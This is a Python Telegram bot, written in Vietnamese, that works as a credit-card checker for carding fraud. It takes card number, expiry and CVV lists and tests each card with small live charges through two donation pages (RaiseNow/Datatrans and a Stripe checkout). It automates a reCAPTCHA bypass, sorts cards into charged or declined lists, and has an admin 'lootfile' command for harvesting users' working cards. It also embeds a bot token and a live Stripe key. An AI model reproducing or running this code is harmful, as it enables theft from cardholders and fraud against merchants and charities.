import telegram
from telegram.ext import Application, CommandHandler, MessageHandler, filters, Defaults, CallbackQueryHandler
import requests
import json
import logging
import asyncio
import io
import re
import time
import os
import shutil
import sys
from datetime import datetime
from pytz import timezone
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from concurrent.futures import ThreadPoolExecutor, as_completed

# --- CẤU HÌNH ---
BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
ADMIN_ID = 5127429005
ADMIN_USERNAME = "@startsuttdow"

# --- TÊN FILE & THƯ MỤC LƯU TRỮ ---
USER_FILE = "authorized_users.txt"
LIMIT_FILE = "user_limits.json"
STATS_FILE = "user_stats.json"
PREFS_FILE = "user_prefs.json"
LOG_DIR = "check_logs"
CONFIG_FILE = "bot_config.json"

# --- GIỚI HẠN MẶC ĐỊNH CHO THÀNH VIÊN ---
DEFAULT_MEMBER_LIMIT = 100
MEMBER_THREAD_LIMIT = 3

# --- CẤU HÌNH MÚI GIỜ ---
VIETNAM_TZ = timezone('Asia/Ho_Chi_Minh')

# --- BIẾN TOÀN CỤC ĐỂ THEO DÕI TÁC VỤ ĐANG CHẠY ---
ACTIVE_CHECKS = set()

# --- CẤU HÌNH LOGGING ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# --- KHỞI TẠO ---
os.makedirs(LOG_DIR, exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "gate_1"), exist_ok=True)
os.makedirs(os.path.join(LOG_DIR, "gate_2"), exist_ok=True)

# --- QUẢN LÝ CẤU HÌNH & DATA ---
def load_json_file(filename, default_data={}):
    if not os.path.exists(filename):
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(default_data, f, indent=4)
        return default_data
    try:
        with open(filename, "r", encoding='utf-8') as f:
            # Handle empty file case
            if os.path.getsize(filename) == 0:
                return default_data
            return json.load(f)
    except (json.JSONDecodeError, FileNotFoundError):
        return default_data

def save_json_file(filename, data):
    with open(filename, "w", encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_config():
    return load_json_file(CONFIG_FILE, default_data={"active_gate": 1, "bot_on": True})

def save_config(data):
    save_json_file(CONFIG_FILE, data)

def load_users():
    try:
        if not os.path.exists(USER_FILE):
            return set()
        with open(USER_FILE, "r") as f:
            return {int(line.strip()) for line in f if line.strip().isdigit()}
    except FileNotFoundError:
        return set()

def save_users(user_set):
    with open(USER_FILE, "w") as f:
        for user_id in user_set:
            f.write(str(user_id) + "\n")

def get_user_limit(user_id):
    limits = load_json_file(LIMIT_FILE, {})
    return limits.get(str(user_id), DEFAULT_MEMBER_LIMIT)

def get_user_lang(user_id):
    prefs = load_json_file(PREFS_FILE, {})
    return prefs.get(str(user_id), None)

def set_user_lang(user_id, lang_code):
    prefs = load_json_file(PREFS_FILE, {})
    prefs[str(user_id)] = lang_code
    save_json_file(PREFS_FILE, prefs)

def update_user_stats(user_id, user_info, counts, gate_num):
    stats = load_json_file(STATS_FILE, {})
    user_id_str = str(user_id)
    gate_key = f"gate_{gate_num}"
    
    if user_id_str not in stats:
        stats[user_id_str] = {}
    if gate_key not in stats[user_id_str]:
        stats[user_id_str][gate_key] = {
            'username': user_info.username,
            'full_name': user_info.full_name,
            'total_charged': 0,
            'total_custom': 0,
            'total_decline': 0,
            'total_error': 0,
            'total_invalid': 0,
            'last_check_timestamp': ''
        }
    
    # Ensure all keys exist before incrementing
    for key in ['total_charged', 'total_custom', 'total_decline', 'total_error', 'total_invalid']:
        if key not in stats[user_id_str][gate_key]:
            stats[user_id_str][gate_key][key] = 0

    stats[user_id_str][gate_key]['total_charged'] += counts.get('success', 0)
    stats[user_id_str][gate_key]['total_custom'] += counts.get('custom', 0)
    stats[user_id_str][gate_key]['total_decline'] += counts.get('decline', 0)
    stats[user_id_str][gate_key]['total_error'] += counts.get('error', 0)
    stats[user_id_str][gate_key]['total_invalid'] += counts.get('invalid_format', 0)
    stats[user_id_str][gate_key]['last_check_timestamp'] = datetime.now(VIETNAM_TZ).strftime("%Y-%m-%d %H:%M:%S")
    save_json_file(STATS_FILE, stats)

# --- CÁC HÀM CỐT LÕI ---
def make_request_with_retry(session, method, url, max_retries=10, **kwargs):
    last_exception = None
    for attempt in range(max_retries):
        try:
            response = session.request(method, url, **kwargs)
            return response, None
        except requests.exceptions.RequestException as e:
            last_exception = e
            time.sleep(attempt + 1)
    return None, f"Tất cả {max_retries} lần thử lại đều thất bại. Lỗi cuối cùng: {last_exception}"

def get_bin_info(session, cc):
    bin_info = {}
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    try:
        bin_response, error = make_request_with_retry(session, 'get', f"https://bins.antipublic.cc/bins/{cc[:6]}", headers={"user-agent": ua, "Pragma": "no-cache", "Accept": "*/*"}, timeout=10)
        if not error and bin_response.status_code == 200 and "not found" not in bin_response.text:
            bin_info.update(bin_response.json())
    except Exception as e:
        logger.error(f"Lỗi kiểm tra BIN: {e}", exc_info=True)
    return bin_info

def validate_card_format(cc, mes, ano, cvv):
    if not (cc.isdigit() and 10 <= len(cc) <= 19): return False, "Số thẻ (CC) phải có từ 10-19 chữ số."
    if not (mes.isdigit() and 1 <= len(mes) <= 2 and 1 <= int(mes) <= 12): return False, "Tháng (MM) phải là số từ 1 đến 12."
    if not (ano.isdigit() and len(ano) in [2, 4]): return False, "Năm (YY) phải có 2 hoặc 4 chữ số."
    if not (cvv.isdigit() and 3 <= len(cvv) <= 4): return False, "CVV phải có 3 hoặc 4 chữ số."
    return True, ""

def parse_card_line(line):
    parts = line.strip().split('|')
    cc, mes, ano, cvv = "", "", "", ""
    if len(parts) == 4:
        cc, mes, ano, cvv = [p.strip() for p in parts]
    elif len(parts) == 3:
        cc_part, date_part, cvv_part = [p.strip() for p in parts]
        if '/' in date_part:
            date_split = date_part.split('/')
            if len(date_split) == 2:
                cc, mes, ano, cvv = cc_part, date_split[0].strip(), date_split[1].strip(), cvv_part
            else: return None, "Định dạng ngày tháng không hợp lệ (mm/yy)."
        else: return None, "Thiếu dấu '/' trong phần ngày tháng."
    else: return None, "Dòng phải có dạng cc|mm|yy|cvv hoặc cc|mm/yy|cvv."
    
    is_valid, error_message = validate_card_format(cc, mes, ano, cvv)
    if not is_valid: return None, error_message
    
    if len(ano) == 2: ano = f"20{ano}"
    return (cc, mes, ano, cvv), None

def check_card_gate1(line):
    GATEWAY_NAME = "Charge 0.5$ New Api"
    card_details, error = parse_card_line(line)
    if error: return 'invalid_format', line, error, {}, GATEWAY_NAME

    cc, mes, ano, cvv = card_details
    session = requests.Session()
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"
    session.headers.update({"User-Agent": ua})
    bin_info = get_bin_info(session, cc)
    try:
        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
        tokenize_payload = { "mode": "TOKENIZE", "formId": "250731042226459797", "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": ua, "browserJavaEnabled": "false", "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, timeout=15)
        if error: return 'error', line, f"Lỗi Tokenize: {error}", bin_info, GATEWAY_NAME
        
        token_data = token_response.json()
        transaction_id = token_data.get("transactionId")
        if not transaction_id: return 'decline', line, token_data.get("error", {}).get("message", "Unknown error"), bin_info, GATEWAY_NAME
        
        payment_url = "https://api.raisenow.io/payments"
        payment_payload = { "account_uuid": "28b36aa5-879a-438a-886f-434d78d1184d", "test_mode": False, "create_supporter": False, "amount": {"currency": "CHF", "value": 50}, "supporter": {"locale": "en", "first_name": "Minh", "last_name": "Nhat", "email": "minhnhat.144417@gmail.com"}, "payment_information": {"brand_code": "eca", "cardholder": "Minh Nhat", "expiry_month": mes, "expiry_year": ano, "transaction_id": transaction_id}, "profile": "a8c1fc04-0647-4781-888b-8783d35ca2f5" }
        payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, timeout=20)
        if error: return 'error', line, f"Lỗi Payment: {error}", bin_info, GATEWAY_NAME

        response_text = payment_response.text
        if '"payment_status":"succeeded"' in response_text: return 'success', line, "Transaction successful!", bin_info, GATEWAY_NAME
        if '"payment_status":"failed"' in response_text: return 'decline', line, "Transaction declined", bin_info, GATEWAY_NAME
        if '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text: return 'custom', line, "3D Secure Required", bin_info, GATEWAY_NAME
        return 'unknown', line, response_text, bin_info, GATEWAY_NAME
    except Exception as e: return 'error', line, f"Lỗi hệ thống: {e}", bin_info, GATEWAY_NAME

def solve_recaptcha_gate2(session):
    try:
        anchor_url = "https://www.google.com/recaptcha/api2/anchor?ar=1&k=6Lf1lR0qAAAAAETSPs7KD79dC4DPVTFu8OOWLYX9&co=aHR0cHM6Ly9zdWJzY3JpcHRpb25zLmJvb2tmb3J1bS5jb206NDQz&hl=vi&v=_cn5mBoBXIA0_T7xBjxkUqUA&size=invisible&cb=aov1eimb2rcc"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36"}
        anchor_res, error = make_request_with_retry(session, 'get', anchor_url, headers=headers, timeout=15)
        if error: return None, f"Recaptcha-Anchor: {error}"
        
        token_match = re.search(r'id="recaptcha-token" value="([^"]+)"', anchor_res.text)
        if not token_match: return None, "Recaptcha-Token not found"
        
        reload_url = "https://www.google.com/recaptcha/api2/reload?k=6Lf1lR0qAAAAAETSPs7KD79dC4DPVTFu8OOWLYX9"
        reload_payload = f"v=_cn5mBoBXIA0_T7xBjxkUqUA&reason=q&c={token_match.group(1)}&k=6Lf1lR0qAAAAAETSPs7KD79dC4DPVTFu8OOWLYX9&co=aHR0cHM6Ly9zdWJzY3JpcHRpb25zLmJvb2tmb3J1bS5jb206NDQz&hl=en&size=invisible"
        reload_res, error = make_request_with_retry(session, 'post', reload_url, headers={'Content-Type': 'application/x-www-form-urlencoded', **headers}, data=reload_payload, timeout=15)
        if error: return None, f"Recaptcha-Reload: {error}"

        cap_match = re.search(r'\["rresp","([^"]+)"\]', reload_res.text)
        if not cap_match: return None, "Recaptcha-Key (rresp) not found"
        return cap_match.group(1), None
    except Exception as e: return None, f"Exception in Recaptcha: {e}"

def check_card_gate2(line):
    GATEWAY_NAME = "Charge 0.5$ Stripe"
    card_details, error = parse_card_line(line)
    if error: return 'invalid_format', line, error, {}, GATEWAY_NAME

    cc, mes, ano, cvv = card_details
    session = requests.Session()
    session.headers.update({"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36"})
    bin_info = get_bin_info(session, cc)
    try:
        captcha_key, error = solve_recaptcha_gate2(session)
        if error: return 'error', line, f"Lỗi Captcha: {error}", bin_info, GATEWAY_NAME

        checkout_url = f"https://subscriptions.bookforum.com/api/checkout?captcha={captcha_key}"
        checkout_payload = {"event":{"cart":{"items":[],"giftsubs":[],"donation":{"process":"onetime","amount":50},"subscription":None}},"form":{"name":"Minh Nhat","email":"minhnhat.144417@gmail.com","address":{"line1":"2830 Oakridge Farm Lane","city":"West Allis","postcode":"53227","country":"US"},"origin":"donate-page"}}
        checkout_res, error = make_request_with_retry(session, 'post', checkout_url, json=checkout_payload, timeout=20)
        if error: return 'error', line, f"Lỗi Checkout: {error}", bin_info, GATEWAY_NAME
        
        checkout_data = checkout_res.json()
        intent_id, client_secret = checkout_data.get("payment_intent_id"), checkout_data.get("stripe_secret")
        if not intent_id or not client_secret: return 'error', line, f"Không lấy được Intent/Secret: {checkout_res.text}", bin_info, GATEWAY_NAME
        
        confirm_url = f"https://api.stripe.com/v1/payment_intents/{intent_id}/confirm"
        confirm_payload = f"return_url=https%3A%2F%2Fsubscriptions.bookforum.com%2Fdonate&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[guid]=NA&payment_method_data[muid]=NA&payment_method_data[sid]=NA&key=pk_live_51N5VPQHMj9WRjRZttfGty42dIdzXaX9M9aWxisN65OCzhjnqCJew1tEZzfN2oGx1rljGg2PBZvcr1W9Q7H1o7iMD00DPMAWlp4&client_secret={client_secret}"
        confirm_res, error = make_request_with_retry(session, 'post', confirm_url, headers={"content-type": "application/x-www-form-urlencoded"}, data=confirm_payload, timeout=20)
        if error: return 'error', line, f"Lỗi Confirm Stripe: {error}", bin_info, GATEWAY_NAME
        
        response_text = confirm_res.text
        decline_message = "Declined"
        try:
            error_data = confirm_res.json().get("error", {})
            decline_message = error_data.get("decline_code") or error_data.get("code") or error_data.get("message", decline_message)
        except json.JSONDecodeError: pass

        if '"status": "succeeded"' in response_text: return 'success', line, "Transaction successful!", bin_info, GATEWAY_NAME
        if '"status": "requires_action"' in response_text or '"status": "requires_source_action"' in response_text: return 'custom', line, "3D Secure Required", bin_info, GATEWAY_NAME
        if "insufficient_funds" in response_text or "Your card has insufficient funds" in response_text: return 'decline', line, "insufficient_funds", bin_info, GATEWAY_NAME
        
        return 'decline', line, decline_message, bin_info, GATEWAY_NAME

    except Exception as e: return 'error', line, f"Lỗi hệ thống: {e}", bin_info, GATEWAY_NAME

def check_card(line):
    gate = load_config().get("active_gate", 1)
    if gate == 2:
        return check_card_gate2(line)
    return check_card_gate1(line)

def create_progress_bar(current, total, length=10):
    if total == 0: return "[                      ] 0%"
    fraction = current / total
    bar = '█' * int(length * fraction) + '░' * (length - int(length * fraction))
    return f"[{bar}] {int(fraction * 100)}%"

# --- CÁC HÀM TIỆN ÍCH BOT ---
async def check_maintenance_mode(update: telegram.Update) -> bool:
    # Bỏ qua check cho admin
    if update.effective_user and update.effective_user.id == ADMIN_ID:
        return False
    
    config = load_config()
    if not config.get("bot_on", True):
        if update.message:
            await update.message.reply_text("🛠️ Bot đang trong chế độ bảo trì. Vui lòng thử lại sau. 🛠️")
        return True
    return False

# --- CÁC LỆNH BOT ---
async def start(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    user = update.effective_user
    if user.id in load_users() or user.id == ADMIN_ID:
        await update.message.reply_text(f"**Chào mừng trở lại, {user.first_name}!**\nDùng /help để xem các lệnh.")
    else:
        await update.message.reply_text(f"**Welcome!** 🤖\nYour Telegram ID: `{user.id}`\nContact {ADMIN_USERNAME} to get access.")

async def info(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    await update.message.reply_text(f"🆔 ID Telegram của bạn là: `{update.effective_user.id}`")

async def get_help_text(user_id, lang_code):
    user_limit = get_user_limit(user_id)
    admin_commands = ("**Bảng Lệnh Quản Trị Viên** 👑\n"
                      "Toàn quyền quản lý bot với các lệnh sau:\n\n"
                      "**Quản lý Trạng thái & Cổng:**\n"
                      "🔹 `/on` - Bật bot cho người dùng.\n"
                      "🔹 `/off` - Tắt bot (chế độ bảo trì).\n"
                      "🔹 `/rs` - Khởi động lại bot.\n"
                      "🔹 `/gate <1|2>` - Chọn cổng check (mặc định: 1).\n\n"
                      "**Quản lý User & Giới hạn:**\n"
                      "🔹 `/add <user_id>` - Cho phép user sử dụng bot.\n"
                      "🔹 `/ban <user_id>` - Xóa quyền truy cập của user.\n"
                      "🔹 `/show` - Hiển thị danh sách user và hạn mức.\n"
                      "🔹 `/addlimit <user_id> <số>` - Cộng thêm giới hạn check.\n\n"
                      "**Giám sát & Lịch sử:**\n"
                      "🔹 `/showcheck` - Xem thống kê hoạt động của tất cả user.\n"
                      "🔹 `/lootfile <user_id>` - Xem và tải lại lịch sử check file.")
    
    member_commands = ("**Bảng Lệnh Thành Viên** 👤\n"
                       "Bạn đã được cấp quyền! Sử dụng các lệnh sau để check thẻ:\n\n"
                       "🔹 `/cs <thẻ>`\n"
                       "   - *Mô tả:* Kiểm tra một thẻ tín dụng duy nhất.\n"
                       "   - *Định dạng:* `Số thẻ|Tháng|Năm|CVV` hoặc `Số thẻ|Tháng/Năm|CVV`\n"
                       "   - *Ví dụ:* `/cs 4031630741125602|11/2028|123`\n\n"
                       "🔹 `/mass<số luồng> <file.txt>`\n"
                       "   - *Mô tả:* Kiểm tra hàng loạt thẻ từ một tệp `.txt`.\n"
                       "   - *Ví dụ:* Gửi file và ghi caption là `/mass3` để chạy 3 luồng.\n\n"
                       f"💳 **Hạn mức của bạn:** `{user_limit}` lines/file.\n"
                       f"🌟 **Nâng cấp Premium:** Liên hệ {ADMIN_USERNAME} để check không giới hạn.")
    
    public_commands = ("**Bảng Lệnh Công Khai** 🛠️\n"
                       "Chào mừng bạn! Dưới đây là các lệnh cơ bản bạn có thể sử dụng:\n\n"
                       "🔹 `/start` - Khởi động bot và nhận ID Telegram.\n"
                       "🔹 `/info` - Lấy lại ID Telegram.\n"
                       "🔹 `/help` - Hiển thị bảng trợ giúp này.\n\n"
                       f"**Nâng cấp Premium:**\nĐể sử dụng các tính năng check không giới hạn, vui lòng liên hệ Admin: {ADMIN_USERNAME}")

    if user_id == ADMIN_ID:
        return f"{admin_commands}\n\n{member_commands.split('💳 **Hạn mức của bạn:**')[0].strip()}"
    elif user_id in load_users():
        return f"{member_commands}\n\n{public_commands}"
    else:
        return public_commands

async def help_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    help_text = await get_help_text(update.effective_user.id, 'vi')
    await update.message.reply_text(help_text, disable_web_page_preview=True)

async def cs_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        return

    if not context.args:
        await update.message.reply_text("Sử dụng: `/cs cc|mm|yy|cvv` hoặc `/cs cc|mm/yy|cvv`")
        return
    
    line = " ".join(context.args)
    msg = await update.message.reply_text("⏳ *Checking your card, please wait...*")
    try:
        status, original_line, full_response, bin_info, gateway_name = await asyncio.to_thread(check_card, line)
        
        status_text = "❔ UNKNOWN"
        if status == 'success':
            status_text = "✅ CHARGED 0.5$" if "Stripe" in gateway_name else "✅ CHARGED"
        elif status == 'decline': status_text = "❌ DECLINED"
        elif status == 'custom': status_text = "🔒 3D SECURE"
        elif status == 'invalid_format': status_text = "📋 FORMAT ERROR"
        elif status == 'error': status_text = "❗️ ERROR"

        bin_str = (f"`{bin_info.get('bank', 'N/A')}`\n*- Country:* `{bin_info.get('country_name', 'N/A')}`\n*- Type:* `{bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')}`")
        final_message = (f"**💠 CARD CHECK RESULT 💠**\n\n"
                         f"**💳 Card:** `{original_line}`\n"
                         f"**🚦 Status: {status_text}**\n"
                         f"**💬 Response:** `{full_response}`\n\n"
                         f"**🏦 Gateway:** `{gateway_name}`\n\n"
                         f"**ℹ️ BIN Info:**\n{bin_str}\n\n"
                         f"👤 *Checker by: {ADMIN_USERNAME}*")
        await msg.edit_text(final_message)
    except Exception as e:
        logger.error(f"Lỗi trong /cs: {e}", exc_info=True)
        await msg.edit_text(f"⛔️ **System Error:** `{e}`")

async def mass_check_handler(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if await check_maintenance_mode(update): return
    user = update.effective_user
    if user.id != ADMIN_ID and user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to start a new check while one is already running.")
        await context.bot.send_message(chat_id=ADMIN_ID, text=f"⚠️ **Cảnh báo Spam** ⚠️\n\nThành viên `{user.id}` ({user.full_name or 'N/A'}) đang cố gắng gửi file mới trong khi tác vụ khác đang chạy.")
        return
    if user.id != ADMIN_ID and user.id not in load_users(): return
    if not update.message.document or not update.message.document.file_name.lower().endswith('.txt'):
        await update.message.reply_text("Vui lòng đính kèm một tệp .txt")
        return
    
    file = await context.bot.get_file(update.message.document.file_id)
    lines = [line for line in (await file.download_as_bytearray()).decode('utf-8').splitlines() if line.strip()]
    total_lines = len(lines)
    if not lines:
        await update.message.reply_text("📂 Tệp trống.")
        return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(f"⛔️ **Vượt quá giới hạn!**\nTệp của bạn có `{total_lines}` dòng, nhưng giới hạn là `{user_limit}` dòng.")
            return

    gate_num = load_config().get("active_gate", 1)
    caption = update.message.caption or "/mass"
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match else 10
    num_threads = min(requested_threads, MEMBER_THREAD_LIMIT) if user.id != ADMIN_ID else min(50, requested_threads)
    
    session_dir = os.path.join(LOG_DIR, f"gate_{gate_num}", str(user.id), datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S"))
    os.makedirs(session_dir, exist_ok=True)
    status_message = await update.message.reply_text(f"⏳ Khởi tạo Gate {gate_num}... Đang kiểm tra `{total_lines}` thẻ với `{num_threads}` luồng.")
    
    try:
        if user.id != ADMIN_ID: ACTIVE_CHECKS.add(user.id)
        counts = {'success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0}
        result_lists = {k: [] for k in counts.keys()}
        processed_count, last_update_time = 0, time.time()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line): line for line in lines}
            for future in as_completed(future_to_line):
                processed_count += 1
                status, original_line, full_response, bin_info, _ = future.result()
                
                # Ensure status is a valid key
                if status not in counts:
                    status = 'unknown'

                counts[status] += 1
                bin_str = f"| {bin_info.get('bank', 'N/A')} - {bin_info.get('type', 'N/A')} - {bin_info.get('brand', 'N/A')} - {bin_info.get('country_name', 'N/A')}"
                line_to_save = f"{original_line} {bin_str} | Response: {full_response}"
                result_lists[status].append(line_to_save)
                
                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    status_text = (f"**🚀 Checking in progress...**\n{progress_bar}\n"
                                   f"**Progress:** `{processed_count}/{total_lines}` | **Threads:** `{num_threads}`\n\n"
                                   f"✅ **Charged:** `{counts['success']}`\n❌ **Declined:** `{counts['decline']}`\n"
                                   f"🔒 **3D Secure:** `{counts['custom']}`\n📋 **Invalid:** `{counts['invalid_format']}`\n"
                                   f"❔ **Errors:** `{counts['error'] + counts['unknown']}`")
                    try:
                        await status_message.edit_text(text=status_text)
                    except telegram.error.BadRequest:
                        pass
                    last_update_time = time.time()
        
        await status_message.edit_text(f"**📊 Check Complete!**\n\n(Kết quả sẽ được gửi dưới dạng tệp tin)")
        update_user_stats(user.id, user, counts, gate_num)

        file_map = {'success': 'charged.txt', 'decline': 'declined.txt', 'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt', 'error': 'errors.txt', 'unknown': 'unknown.txt'}
        for status, filename in file_map.items():
            if result_lists.get(status):
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write("\n".join(result_lists[status]))
                await context.bot.send_document(chat_id=update.effective_chat.id, document=open(file_path, 'rb'))
    except Exception as e:
        logger.error(f"Lỗi trong mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"⛔️ **Lỗi nghiêm trọng!** `{e}`")
    finally:
        if user.id != ADMIN_ID: ACTIVE_CHECKS.discard(user.id)


# --- LỆNH ADMIN ---
async def on_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    config = load_config()
    config["bot_on"] = True
    save_config(config)
    await update.message.reply_text("✅ Bot đã được bật. Người dùng có thể sử dụng các lệnh.")

async def off_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    config = load_config()
    config["bot_on"] = False
    save_config(config)
    await update.message.reply_text("❌ Bot đã được tắt (chế độ bảo trì). Chỉ admin có thể sử dụng.")

async def reset_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    await update.message.reply_text("🔄 Bot đang khởi động lại...")
    # Cleanly close the current application instance before restarting
    await context.application.shutdown()
    os.execv(sys.executable, ['python'] + sys.argv)

async def gate_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    config = load_config()
    current_gate = config.get("active_gate", 1)
    if not context.args:
        await update.message.reply_text(f"Cú pháp: `/gate <1|2>`\nCổng hiện tại: **Gate {current_gate}**.")
        return
    try:
        new_gate = int(context.args[0])
        if new_gate not in [1, 2]: raise ValueError
        config["active_gate"] = new_gate
        save_config(config)
        await update.message.reply_text(f"✅ Đã chuyển sang **Gate {new_gate}** thành công!")
    except (ValueError, IndexError):
        await update.message.reply_text(f"❌ Lỗi: Vui lòng chọn `1` hoặc `2`.")

async def show_check_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE, {})
    if not stats:
        await update.message.reply_text("Chưa có dữ liệu thống kê.")
        return
    
    message = "📊 **THỐNG KÊ CHECK CỦA USER** 📊\n\n"
    all_users = load_users()
    all_users.add(ADMIN_ID)
    
    for user_id in sorted(list(all_users)):
        user_id_str = str(user_id)
        user_data = stats.get(user_id_str, {})
        
        # Try to get user info from any available gate data
        user_info = {}
        if "gate_1" in user_data:
            user_info = user_data["gate_1"]
        elif "gate_2" in user_data:
            user_info = user_data["gate_2"]
            
        user_display = f"@{user_info.get('username')}" if user_info.get('username') else f"ID: {user_id_str}"
        message += f"👤 **{user_display}** (`{user_id_str}`)\n"
        
        if not user_data:
            message += "  *Chưa từng check.*\n"
        else:
            has_data = False
            for i in [1, 2]:
                gate_key = f"gate_{i}"
                data = user_data.get(gate_key)
                if data:
                    has_data = True
                    message += (f"  ᐅ **Gate {i}:**\n"
                                f"    ✅ Charged: `{data.get('total_charged', 0)}` | ❌ Declined: `{data.get('total_decline', 0)}`\n"
                                f"    🔒 Custom: `{data.get('total_custom', 0)}` | ❔ Lỗi: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                                f"    🕒 Lần cuối: `{data.get('last_check_timestamp', 'N/A')}`\n")
            if not has_data:
                message += "  *Chưa từng check.*\n"
        message += "--------------------\n"
        
    await update.message.reply_text(message)


async def loot_file_command(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/lootfile <user_id>`")
        return
    target_user_id = context.args[0]
    keyboard = [
        [InlineKeyboardButton("Lịch sử Gate 1", callback_data=f"loot_mainmenu_gate1_{target_user_id}")],
        [InlineKeyboardButton("Lịch sử Gate 2", callback_data=f"loot_mainmenu_gate2_{target_user_id}")],
    ]
    await update.message.reply_text(f"Chọn cổng để xem lịch sử của user `{target_user_id}`:", reply_markup=InlineKeyboardMarkup(keyboard))

async def button_handler(update: telegram.Update, context: telegram.ext.ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data.split('_')
    command = data[0]
    
    if command == "loot":
        action = data[1]
        gate_num = re.search(r'gate(\d+)', data[2]).group(1)
        target_user_id = data[3]
        
        session_ts = data[4] if len(data) > 4 else None
        filename = data[5] if len(data) > 5 else None

        user_log_dir = os.path.join(LOG_DIR, f"gate_{gate_num}", target_user_id)

        if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
            await query.edit_message_text(f"Không tìm thấy lịch sử Gate {gate_num} cho user `{target_user_id}`.")
            return

        if action == "mainmenu":
            keyboard = [[InlineKeyboardButton("1. Lấy File Charge Gần Nhất", callback_data=f"loot_latestcharge_gate{gate_num}_{target_user_id}")],
                        [InlineKeyboardButton("2. Lấy Tất Cả File Charge", callback_data=f"loot_allcharge_gate{gate_num}_{target_user_id}")],
                        [InlineKeyboardButton("3. Chọn Từ Lịch Sử", callback_data=f"loot_history_gate{gate_num}_{target_user_id}")]]
            await query.edit_message_text(f"Chọn tùy chọn cho **Gate {gate_num}** của user `{target_user_id}`:", reply_markup=InlineKeyboardMarkup(keyboard))
        
        elif action == "latestcharge":
            latest_session = sorted(os.listdir(user_log_dir), reverse=True)[0]
            file_path = os.path.join(user_log_dir, latest_session, "charged.txt")
            if os.path.exists(file_path):
                await context.bot.send_document(chat_id=query.from_user.id, document=open(file_path, 'rb'))
                await query.edit_message_text(f"✅ Đã gửi file charge gần nhất từ Gate {gate_num}, session `{latest_session}`.")
            else:
                await query.edit_message_text(f"ℹ️ Lần check gần nhất (`{latest_session}`) trên Gate {gate_num} không có thẻ charge nào.")

        elif action == "allcharge":
            all_charged_content = []
            for session in sorted(os.listdir(user_log_dir)):
                file_path = os.path.join(user_log_dir, session, "charged.txt")
                if os.path.exists(file_path):
                    with open(file_path, 'r', encoding='utf-8') as f:
                        all_charged_content.append(f.read())
            if all_charged_content:
                combined_content = "\n".join(all_charged_content)
                file_to_send = io.BytesIO(combined_content.encode('utf-8'))
                await context.bot.send_document(chat_id=query.from_user.id, document=file_to_send, filename=f"gate{gate_num}_all_charged_{target_user_id}.txt")
